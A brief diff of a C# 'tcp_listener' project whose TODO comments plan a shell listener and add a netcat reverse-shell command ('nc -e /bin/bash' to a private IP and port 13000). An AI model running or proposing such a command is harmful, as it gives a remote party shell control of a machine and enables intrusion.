@@ -13,6 +13,7 @@ using System.Net.Sockets;
 //- Need to accept input on listener side
 //- Maybe find a way to enter a command for the shell to execute once connected??
 //- Also find a way to code a payload for netcat eg: nc 192.xxx.x.x 0000 - maybe use bash command along side?
+//- command to execute linux side i'm pretty sure will be - 'nc -e /bin/bash 192.168.x.x 13000'
 
 namespace tcp_listener
 {
